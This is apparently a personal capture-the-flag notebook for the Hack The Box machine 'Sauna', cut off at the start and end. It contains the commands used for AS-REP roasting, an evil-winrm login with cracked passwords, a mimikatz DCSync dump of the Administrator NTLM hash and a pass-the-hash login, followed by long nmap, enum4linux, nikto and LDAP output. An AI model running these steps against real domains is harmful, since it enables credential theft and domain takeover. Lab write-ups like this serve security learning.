/>4961976bd7d8f4eeb2ce3705e2f212f2<br />root<br />12909612d25c8dcf6e5a07d1a804a0bc</div><div class='page'><h1 class='title level-4'>10.10.10.175 Sauna</h1><br/>nmap showed that an assload of ports were open<br />I was able to start creating a userlist from contacts on the about.html page<br />While enumerationg ldap I was able to add one more potential user.<br />I used GetNPUsers.py to test my userlist and possibly dump a hash<br />GetNPUsers.py egotistical-bank.local/ -usersfile names.txt  -dc-ip 10.10.10.175 -format hashcat -request<br />Success! Dumped fsmith and a hash. Broke it with hashcat.<br />fsmith:Thestrokes23<br />./evil-winrm.rb -i 10.10.10.175 -u fsmith -p Thestrokes23<br />user.txt!<br /><br />winPEAS showed me that there were exposed default logon creds<br />svc_loanmgr:Moneymakestheworldgoround!<br />evil-winrm in as svc_loanmgr<br /><br />took a shot and used mimikatz...<br />dumped!<br />.\mimikatz.exe &quot;lsadump::dcsync /user:Administrator&quot; &quot;exit&quot;<br /><br />#################################################################################################<br />*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; .\mimikatz.exe &quot;lsadump::dcsync /user:Administrator&quot; &quot;exit&quot;<br /><br />  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37<br /> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)<br /> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br /> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz<br /> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br />  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/<br /><br />mimikatz(commandline) # lsadump::dcsync /user:Administrator<br />[DC] &#39;EGOTISTICAL-BANK.LOCAL&#39; will be the domain<br />[DC] &#39;SAUNA.EGOTISTICAL-BANK.LOCAL&#39; will be the DC server<br />[DC] &#39;Administrator&#39; will be the user account<br /><br />Object RDN           : Administrator<br /><br />** SAM ACCOUNT **<br /><br />SAM Username         : Administrator<br />Account Type         : 30000000 ( USER_OBJECT )<br />User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br />Account expiration   : <br />Password last change : 1/24/2020 10:14:15 AM<br />Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500<br />Object Relative ID   : 500<br /><br />Credentials:<br />  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff<br />    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff<br />    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f<br />    lm  - 0: ee8c50e6bc332970a8e8a632488f5211<br />#################################################################################################<br /><br />./evil-winrm.rb -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff<br />rooted!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>SquidsDnsTool retuned nothing of interest<br /><br />crackmapexec smb 10.10.10.175<br />SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICALBANK) (signing:True) (SMBv1:False)<br />^^added domain to /etc/hosts<br /><br />getArch.py got me the system architecture (x64)<br /><br />6 names found at about.html<br />1 more name found while enumeration ldap<br /><br />GetNPUsers.py egotistical-bank.local/ -usersfile names.txt  -dc-ip 10.10.10.175 -format hashcat -request<br /><br />fsmith<br />Thestrokes23<br /><br />users<br />administrator, hsmith, fsmith, svc_loanmgr<br /><br />svc_loanmgr<br />Moneymakestheworldgoround!<br /><br /><br /><br />./mimikatz.exe “lsadump::dcsync /user:Administrator” “exit”</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap 10.10.10.175 &amp;&amp; nmap -sC -sV 10.10.10.175 &amp;&amp; nmap -p- 10.10.10.175<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-11 14:20 EDT<br />Nmap scan report for 10.10.10.175<br />Host is up (0.19s latency).<br />Not shown: 988 filtered ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />80/tcp   open  http<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 12.05 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-11 14:21 EDT<br />Nmap scan report for 10.10.10.175<br />Host is up (0.18s latency).<br />Not shown: 988 filtered ports<br />PORT     STATE SERVICE       VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />80/tcp   open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Egotistical Bank :: Home<br />88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-12 01:21:23Z)<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds?<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.80%I=7%D=4/11%Time=5E920AB1%P=x86_64-pc-linux-gnu%r(DNSV<br />SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\<br />SF:x04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: 6h59m49s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-12T01:23:47<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 324.27 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-11 14:26 EDT<br />Nmap scan report for 10.10.10.175<br />Host is up (0.18s latency).<br />Not shown: 65515 filtered ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />80/tcp    open  http<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />5985/tcp  open  wsman<br />9389/tcp  open  adws<br />49667/tcp open  unknown<br />49673/tcp open  unknown<br />49674/tcp open  unknown<br />49675/tcp open  unknown<br />49686/tcp open  unknown<br />56447/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 445.84 seconds<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.175<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 14:26 EDT<br />Nmap scan report for 10.10.10.175<br />Host is up (0.21s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br /><br />Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Sauna$ <br /></div><div class='page'><h1 class='title level-7'>Enum4Linux</h1><br/>enum4linux -a 10.10.10.175<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 11 14:26:49 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.175<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.175    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.175    |<br /> ============================================ <br />Looking up status of 10.10.10.175<br />No reply from 10.10.10.175<br /><br /> ===================================== <br />|    Session Check on 10.10.10.175    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[+] Server 10.10.10.175 allows sessions using username &#39;&#39;, password &#39;&#39;<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.175    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />Domain Name: EGOTISTICALBANK<br />Domain Sid: S-1-5-21-2966785786-3096785034-1186376766<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ====================================== <br />|    OS information on 10.10.10.175    |<br /> ====================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.10.10.175 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.175 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.175    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />[E] Couldn&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />[E] Couldn&#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.175    |<br /> ========================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.175<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.175    |<br /> ==================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.10.10.175 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.10.10.175)<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br />[E] Failed to get password policy with rpcclient<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.175    |<br /> ============================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================= <br />|    Users on 10.10.10.175 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.175    |<br /> ============================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br />Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Sat Apr 11 14:27:56 2020<br /></div><div class='page'><h1 class='title level-6'>http</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 10.0<br />|_http-server-header: Microsoft-IIS/10.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.175:80">http://10.10.10.175:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.175<br />+ Target Hostname:    10.10.10.175<br />+ Target Port:        80<br />+ Start Time:         2020-04-11 14:26:35 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ 7863 requests: 0 error(s) and 5 item(s) reported on remote host<br />+ End Time:           2020-04-11 14:54:16 (GMT-4) (1661 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>ldap</h1><br/></div><div class='page'><h1 class='title level-7'>nmap ldap</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Sauna$ nmap -p 389 --script ldap-search -Pn 10.10.10.175<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 15:20 EDT<br />Nmap scan report for EGOTISTICAL-BANK.local (10.10.10.175)<br />Host is up (0.14s latency).<br /><br />PORT    STATE SERVICE<br />389/tcp open  ldap<br />| ldap-search: <br />|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         objectClass: top<br />|         objectClass: domain<br />|         objectClass: domainDNS<br />|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         instanceType: 5<br />|         whenCreated: 2020/01/23 05:44:25 UTC<br />|         whenChanged: 2020/04/11 21:26:12 UTC<br />|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         uSNCreated: 4099<br />|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC<br />|         uSNChanged: 53269<br />|         name: EGOTISTICAL-BANK<br />|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363<br />|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xF3\xC6\xA2\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00<br />|         creationTime: 132311139726046733<br />|         forceLogoff: -9223372036854775808<br />|         lockoutDuration: -18000000000<br />|         lockOutObservationWindow: -18000000000<br />|         lockoutThreshold: 0<br />|         maxPwdAge: -36288000000000<br />|         minPwdAge: -864000000000<br />|         minPwdLength: 7<br />|         modifiedCountAtLastProm: 0<br />|         nextRid: 1000<br />|         pwdProperties: 1<br />|         pwdHistoryLength: 24<br />|         objectSid: 1-5-21-2966785786-3096785034-1186376766<br />|         serverState: 1<br />|         uASCompat: 1<br />|         modifiedCount: 1<br />|         auditingPolicy: \x00\x01<br />|         nTMixedDomain: 0<br />|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         systemFlags: -1946157056<br />|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         isCriticalSystemObject: TRUE<br />|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]<br />|         dSCorePropagationData: 1601/01/01 00:00:00 UTC<br />|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         ms-DS-MachineAccountQuota: 10<br />|         msDS-Behavior-Version: 7<br />|         msDS-PerUserTrustQuota: 1<br />|         msDS-AllUsersTrustQuota: 1000<br />|         msDS-PerUserTrustTombstonesQuota: 10<br />|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|         msDS-NcType: 0<br />|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE<br />|         dc: EGOTISTICAL-BANK<br />|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL<br />|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.40 seconds<br /></div><div class='page'><h1 class='title level-7'>ldapsearch</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Sauna$ ldapsearch -h 10.10.10.175 -x -b &quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;<br /># extended LDIF<br />#<br /># LDAPv3<br /># base &lt;DC=EGOTISTICAL-BANK,DC=LOCAL&gt; with scope subtree<br /># filter: (objectclass=*)<br /># requesting: ALL<br />#<br /><br /># EGOTISTICAL-BANK.LOCAL<br />dn: DC=EGOTISTICAL-BANK,DC=LOCAL<br />objectClass: top<br />objectClass: domain<br />objectClass: domainDNS<br />distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL<br />instanceType: 5<br />whenCreated: 20200123054425.0Z<br />whenChanged: 20200411212612.0Z<br />subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br />subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br />subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />uSNCreated: 4099<br />dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==<br />uSNChanged: 53269<br />name: EGOTISTICAL-BANK<br />objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==<br />replUpToDateVector:: AgAAAAAAAAACAAAAAAAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAAPPGo<br /> hQDAAAAQL7gs8Yl7ESyuZ/4XESy7AmwAAAAAAAA1ARSFAMAAAA=<br />creationTime: 132311139726046733<br />forceLogoff: -9223372036854775808<br />lockoutDuration: -18000000000<br />lockOutObservationWindow: -18000000000<br />lockoutThreshold: 0<br />maxPwdAge: -36288000000000<br />minPwdAge: -864000000000<br />minPwdLength: 7<br />modifiedCountAtLastProm: 0<br />nextRid: 1000<br />pwdProperties: 1<br />pwdHistoryLength: 24<br />objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG<br />serverState: 1<br />uASCompat: 1<br />modifiedCount: 1<br />auditingPolicy:: AAE=<br />nTMixedDomain: 0<br />rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL<br />fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name<br /> ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />systemFlags: -1946157056<br />wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT<br /> ISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra<br /> m Data,DC=EGOTISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO<br /> TISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin<br /> cipals,DC=EGOTISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=<br /> EGOTISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E<br /> GOTISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO<br /> TISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC<br /> AL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,<br /> DC=EGOTISTICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS<br /> TICAL-BANK,DC=LOCAL<br />wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA<br /> L-BANK,DC=LOCAL<br />objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D<br /> C=LOCAL<br />isCriticalSystemObject: TRUE<br />gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste<br /> m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]<br />dSCorePropagationData: 16010101000000.0Z<br />otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS<br /> TICAL-BANK,DC=LOCAL<br />otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic<br /> e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL<br />masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN<br /> =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />ms-DS-MachineAccountQuota: 10<br />msDS-Behavior-Version: 7<br />msDS-PerUserTrustQuota: 1<br />msDS-AllUsersTrustQuota: 1000<br />msDS-PerUserTrustTombstonesQuota: 10<br />msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na<br /> me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N<br /> ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br />msDS-NcType: 0<br />msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE<br />dc: EGOTISTICAL-BANK<br /><br /># Users, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Computers, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Domain Controllers, EGOTISTICAL-BANK.LOCAL<br />dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># System, EGOTISTICAL-BANK.LOCAL<br />dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># LostAndFound, EGOTISTICAL-BANK.LOCAL<br />dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Infrastructure, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL<br />dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Program Data, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># NTDS Quotas, EGOTISTICAL-BANK.LOCAL<br />dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Managed Service 